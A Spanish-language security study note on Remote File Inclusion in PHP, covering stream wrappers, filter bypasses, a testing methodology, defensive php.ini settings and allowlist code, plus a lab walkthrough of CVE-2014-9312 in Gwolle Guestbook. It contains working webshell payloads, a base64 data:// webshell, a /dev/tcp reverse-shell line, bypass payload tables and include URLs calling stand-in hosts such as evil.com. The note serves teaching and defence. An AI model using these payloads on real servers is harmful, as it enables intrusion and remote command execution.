---
aliases:
  - RFI
  - Remote File Inclusion
tags:
  - sec/web
  - sec/web/rfi
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Local File Inclusion]]"
  - "[[Path Traversal]]"
  - "[[OS Command Injection]]"
  - "[[Log Poisoning]]"
  - "[[Abuso de Subida de Archivos]]"
fuente: "https://owasp.org/www-community/attacks/Remote_File_Inclusion"
---

# Remote File Inclusion (RFI)

**Remote File Inclusion** (**RFI**) es una vulnerabilidad en la que una aplicación **incluye y ejecuta archivos remotos** controlados por el atacante, gracias a que una entrada del usuario alimenta directamente funciones de inclusión de archivos (típicamente las de PHP: `include`, `require`, `include_once`, `require_once`) sin sanitizar. Cuando el archivo remoto contiene código que el motor interpreta (PHP, por ejemplo), el resultado es **RCE remota** en el servidor.

> [!info] RFI en una frase
> LFI y RFI comparten raíz — el control total sobre el path de un `include()` —; la diferencia es la **distancia**: LFI incluye archivos del propio servidor (o del filesystem vía traversal), RFI obliga al servidor a **bajar y ejecutar** un archivo desde una URL remota bajo control del atacante. Ver [[Local File Inclusion]] para la comparación completa.

> [!warning] Condición de ejecución — el matiz que muchos olvidan
> Incluir un archivo remoto **no siempre implica ejecución**. PHP solo obtiene contenido remoto si `allow_url_fopen=On`; y solo **interpreta** ese contenido como código si además `allow_url_include=On` (para URLs remotas). Con `allow_url_include=Off` pero `allow_url_fopen=On`, un RFI degrada a inclusión de *texto* remoto — todavía filtrado de información o vector de XSS reflejado si el contenido se imprime en HTML, pero no RCE. Evaluar siempre estas dos directivas antes de calificar la severidad.

## Mecánica: cómo funciona la inclusión en PHP

### La cadena de parseo de un `include`

```php
$page = $_GET['page'];      // entrada del atacante: "http://evil.com/shell.txt"
include($page);             // PHP resuelve el recurso e "inhala" su contenido
```

Cuando PHP ejecuta un `include`, ocurren tres fases:

1. **Resolución del recurso**: PHP interpreta el string como path o URL. Si coincide con el esquema de un *stream wrapper* registrado (`file://`, `http://`, `ftp://`, `php://`, `data://`, `phar://`…), delega al wrapper correspondiente.
2. **Obtención del contenido**: el wrapper abre el recurso (lectura local, petición HTTP, etc.) y devuelve un stream.
3. **Ejecución**: el contenido se parsea como **PHP** (todas las etiquetas `<?php ... ?>`) y el resultado — si lo hay — se emite en la salida. `require`/`require_once` lanzan error fatal si falla; `include` solo avisa.

El atacante controla la fase 1 → forzando un wrapper remoto logra que el servidor se descargue y **ejecute** su código.

### Catálogo de stream wrappers de PHP

| Wrapper | Por defecto | RCE directa | Notas |
|---|---|---|---|
| `file://` | On | No | Lectura local — base de [[Local File Inclusion]] |
| `http://` / `https://` | `allow_url_fopen=On` | Sí (con `allow_url_include=On`) | **El vehículo clásico de RFI** |
| `ftp://` | `allow_url_fopen=On` | Sí (con `allow_url_include`) | También permite *subir* con `ftp://user:pass@host/file` |
| `php://input` | On | Sí (con `allow_url_include=On`) | El cuerpo del POST es el código; no necesita servidor remoto |
| `php://filter` | On | No | Codificación/lectura — cadena LFI, ver [[Local File Inclusion]] |
| `data://` | `allow_url_fopen=On` | Sí (con `allow_url_include=On`) | `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==` — RFI sin infraestructura |
| `phar://` | On | Sí (deserialización) | Abre `phar` → dispara `unserialize()` de metadatos — ver [[Ataques de Deserialización]] |
| `zip://` / `rar://` | On | No directo | Acceso a entradas de un archivo comprimido |
| `expect://` | No (ext. expect) | Sí | Ejecuta comandos: `expect://id` |
| `glob://` | On | No | Enumeración de patrones de archivos |

> [!tip] `data://` como RFI "sin servidor"
> Si el filtro solo valida que el path no contenga `../` o que "empiece por http", pero no valida el esquema, `data://text/plain;base64,<payload>` permite ejecutar PHP sin host remoto. El requisito sigue siendo `allow_url_include=On` (data:// cuenta como inclusión no-local).

## RFI vs LFI vs wrappers remotos

| Aspecto | LFI | RFI |
|---|---|---|
| Origen del archivo | Local (filesystem del servidor) | Remoto (URL bajo control del atacante) |
| Payload típico | `../../../../etc/passwd`, `php://filter/...` | `http://evil.com/shell.txt?`, `data://...` |
| `allow_url_fopen` | Irrelevante | Requerido (`On`) |
| `allow_url_include` | Irrelevante | Requerido para ejecución remota |
| RCE directa | No (requiere encadenar: logs, uploads, session files) | Sí, si el motor interpreta el lenguaje del archivo |
| Precondiciones de red | Ninguna | El servidor debe salir a Internet (egress) |
| Impacto típico | Lectura de archivos → RCE encadenada | **RCE directa** |

## Bypass de filtros y variantes

### Bypass de comprobaciones por prefijo / blacklist

| Filtro del atacador / defensor | Payload bypass |
|---|---|
| Bloquea `http://` | `https://`, `ftp://`, `//evil.com/shell.txt` (path-relativo con protocolo heredado), `HTTP://` (case) |
| Bloquea `../` | Innecesario con RFI remoto; para volver a LFI: `....//`, `%2e%2e%2f` (ver [[Path Traversal]]) |
| Bloquea el carácter `?` | `http://evil.com/shell.txt%23` (`#` recorta el query), o servidor del atacante que no requiera query: `http://evil.com/shell.txt/` |
| Bloquea `://` | `http:/\/\evil.com/`, `http:%2f%2fevil.com/` (si hay doble decodificación) |
| Bloquea extensión | `http://evil.com/shell.txt%00.jpg` (PHP < 5.3.4, truncado con NUL) |
| Solo permite paths relativos | `//evil.com/shell.txt` hereda el esquema `http:` |

### Servidor de hosting del atacante — recetas

```bash
# Servir el payload con el nombre que espere la app (wp-load.php, config.php…)
echo '<?php system($_GET["c"]); ?>' > wp-load.php
python3 -m http.server 80

# php://input con curl (sin servidor HTTP):
curl -X POST 'http://objetivo/vuln.php?page=php://input' \
     --data '<?php system("id"); ?>'
```

> [!warning] Codificación y parseo
> Si el payload pasa por múltiples capas (WAF → framework → PHP), codificar en base64 (`data://...base64,...`) o doble URL-encode evita filtros de palabras clave. La ofuscación que rompe el parseo del *wrapper* (espacios, case del esquema) es preferible a la que solo rompe el WAF.

## Cadenas RFI → RCE y RFI → impacto

1. **Webshell remota**: el archivo remoto contiene `<?php system($_GET['c']); ?>` → ejecución de comandos inmediata como el usuario del servidor web (`www-data`, `apache`).
2. **Reverse shell**: payload remoto con `bash -i >& /dev/tcp/atacante/443 0>&1` → contexto interactivo.
3. **RFI sobre CGI → [[Shellshock Vulnerabilidad en Bash|Shellshock]]**: en stacks legados, incluir un recurso que dispare un CGI con cabeceras controladas.
4. **Downgrade a lectura**: con `allow_url_include=Off`, incluir URLs que devuelvan contenido interno sensible → combinable con SSRF (ver [[Server-Side Request Forgery (SSRF)]]).

## Metodología de prueba

1. **Descubrir parámetros de inclusión**: parámetros tipo `page`, `file`, `template`, `inc`, `path`, `doc`, `url`, `load`, `pagina`, `lang` en GET/POST/headers/cookies. Fuzzing con wordlists de nombres comunes.
2. **Confirmar control del path**: `?page=../../../../etc/passwd%00` o `?page=....//....//etc/passwd` → lectura = control del path (base LFI).
3. **Probar wrappers**: `php://filter/convert.base64-encode/resource=index.php`, `data://text/plain,<?php phpinfo(); ?>`.
4. **Probar RFI remoto**: `?page=http://TU-COLLABORATOR.net/test` y observar interacción OOB (incluso sin ejecución hay contacto si `allow_url_fopen=On`).
5. **Convertir a RCE**: alojar payload PHP con nombre plausible, incluirlo, ejecutar `id`/`whoami`.
6. **Escalada**: enumerar red, buscar credenciales, escalar privilegias.

## Defensa (con código)

### 1. php.ini: cerrar la capacidad remota (línea de defensa)

```ini
; php.ini — producción
allow_url_fopen = Off        ; PHP no abrirá URLs remotas (rompe RFI y parte de SSRF en PHP)
allow_url_include = Off      ; (obsoleto desde PHP 8.0: la inclusión remota ya fue eliminada)
```

> [!info] PHP 8.0+
> Desde **PHP 8.0**, `allow_url_include` está obsoleto y la inclusión de URLs remotas fue eliminada del núcleo: RFI clásico ya no es posible en PHP moderno. El riesgo persiste en instalaciones 5.x/7.x heredadas y en stacks equivalentes de otros lenguajes.

### 2. Allowlist de incluidos — la defensa real

```php
// VULNERABLE
include($_GET['page']);

// SEGURO: allowlist estricta de identificadores, nunca paths
$allowed = ['home', 'products', 'contact'];
$page = $_GET['page'] ?? 'home';
if (!in_array($page, $allowed, true)) {
    http_response_code(400);
    exit('Página no válida');
}
include __DIR__ . "/pages/$page.php";   // path construido, jamás user-input crudo
```

```python
# SEGURO (Flask): render solo desde directorio de plantillas con nombre validado
import re
from flask import render_template, abort

if not re.fullmatch(r"[a-z0-9_-]{1,32}", page_name):
    abort(400)
return render_template(f"{page_name}.html")   # Jinja2 carga solo del dir de plantillas
```

### 3. Defensa en profundidad

- Deshabilitar wrappers peligrosos: `php -d allow_url_fopen=0`, o con `disable_functions`/hardening (Suhosin: `suhosin.executor.include.whitelist`).
- Egress filtering: los servidores web no deben hacer peticiones salientes arbitrarias (bloquea `http://evil.com` en el plano de red).
- Correr PHP con `open_basedir` acotado y usuario sin privilegios de red/sistema.
- WAF con reglas de wrappers (`php://`, `data://`, `expect://`, `phar://`).

## Notas de la Práctica

En este caso, utilizamos una máquina que modificamos ligeramente con el objetivo de hacerla vulnerable a este tipo de ataque. Lo primero que hicimos fue realizar fuzzing para determinar posibles plugins de WordPress en la aplicación web:

```bash
wfuzz -c --hc=404 -t 200 -w wp-plugins.fuzz.txt http://localhost:31337/FUZZ
```

> [!info] `wfuzz`
> `wfuzz -c --hc=404 -t 200 -w wp-plugins.fuzz.txt http://localhost:31337/FUZZ` fuzzing de directorios/plugins de WordPress: `-c` colorea la salida, `--hc=404` oculta respuestas 404 (aisla lo que existe), `-t 200` usa 200 hilos y `-w` carga el diccionario de nombres de plugins.

![[Pasted image 20250825164045.png]]

Como podemos observar, identificamos un plugin certero: `gwolle-gb`. Para este plugin, utilizaremos `searchsploit` para verificar si existe alguna vulnerabilidad conocida:

![[Pasted image 20250825164203.png]]

Como podemos observar, sí existe una vulnerabilidad. A continuación, analizaremos qué hace exactamente para explotarla:

![[Pasted image 20250825164448.png]]

La vulnerabilidad, al parecer, permite enviar peticiones a un servidor externo a través de la URL proporcionada — es decir, un `include()` de una URL remota alimentada por parámetros del plugin (aquí nace el RFI).

![[Pasted image 20250825164437.png]]

Ahora, procederemos a cargar un archivo `wp-load.php` (el nombre que la aplicación espera incluir) alojado en nuestro servidor con el siguiente contenido:

```php
<?php
	system('whoami');
?>
```

> [!tip] Payload PHP
> El payload ejecuta `whoami` y muestra su salida — prueba de vida. En un escenario real se usaría una reverse shell, lectura de `/etc/shadow`, o movimiento lateral; ver el catálogo de la sección de explotación.

![[Pasted image 20250825164648.png]]

Observamos que ya es posible ejecutar comandos.

> [!info] Resumen de la práctica
> El plugin `Gwolle Guestbook` (CVE-2014-9312) incluía un RFI: un parámetro controlaba el archivo cargado en `wp-load.php` del servidor. Alojando un PHP con `system('whoami')` en un host atacante, la aplicación lo descargó e **interpretó**, logrando RCE como el usuario del servidor web.

**Laboratorio utilizado**: DVWP — https://github.com/vavkamil/dvwp · **Plugin**: Gwolle Guestbook — https://es.wordpress.org/plugins/gwolle-gb/

## Errores comunes

**Del atacante:**
1. No verificar `allow_url_fopen`/`allow_url_include` y dar por hecho RCE: probar primero con un `data://` benigno o colaborador OOB.
2. Ignorar el egress filtering: si el servidor no puede salir a Internet, RFI remoto es imposible — volver a LFI encadenada (logs, uploads, `/proc/self/environ`).
3. Payload sin el **nombre** que la app espera (`wp-load.php`, `config.php`): algunos flujos solo incluyen rutas fijas con un directorio controlado.
4. Olvidar el NUL byte en PHP < 5.3.4 para cortar extensiones forzadas (`.php`, `.jpg`).

**Del defensor:**
1. Sanear solo `../` creyendo que eso cubre RFI: el atacante no necesita traversal si puede dar una URL absoluta.
2. Dejar `allow_url_fopen=On` por compatibilidad con librerías que "solo leen" — es el requisito #1 del RFI y del SSRF en PHP.
3. Incluir desde directorios escribibles por el servidor web (`/tmp`, uploads): convierte un RFI bloqueado en [[Local File Inclusion]] + [[Log Poisoning]].

## Laboratorios y referencias

- **OWASP — Remote File Inclusion**: https://owasp.org/www-community/attacks/Remote_File_Inclusion
- **PayloadsAllTheThings — LFI/RFI**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- **HackTricks — File Inclusion**: https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html
- **DVWP** (lab propio de la nota): https://github.com/vavkamil/dvwp
- Notas internas: [[Local File Inclusion]], [[Log Poisoning]], [[Abuso de Subida de Archivos]]

## Cheat sheet

| Paso | Payload / acción |
|---|---|
| Detectar control | `?page=../../../../etc/passwd%00` |
| Wrapper lectura | `php://filter/convert.base64-encode/resource=index.php` |
| RFI sin servidor | `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==` |
| RFI clásica | `http://ATTACKER/shell.txt` con `shell.txt` = `<?php system($_GET['c']); ?>` |
| Confirmar OOB | `http://TU-COLLABORATOR.net/t` → interacción en Collaborator |
| Requisitos | `allow_url_fopen=On` + `allow_url_include=On` + egress abierto |
| Defensa | Allowlist de nombres + `allow_url_*=Off` + egress filtering |

## Relacionadas

- [[Local File Inclusion]] — la cara hermana del mismo `include()` controlado
- [[Path Traversal]] — la técnica de navegación de paths que alimenta la fase LFI
- [[OS Command Injection]] — impacto equivalente (RCE) por otra superficie
- [[Log Poisoning]] — materializar RCE cuando el RFI está bloqueado pero el LFI existe
- [[Abuso de Subida de Archivos]] — subir el payload al propio servidor y luego incluirlo
- [[Server-Side Request Forgery (SSRF)]] — cuando la "inclusión remota" es solo petición HTTP sin ejecución
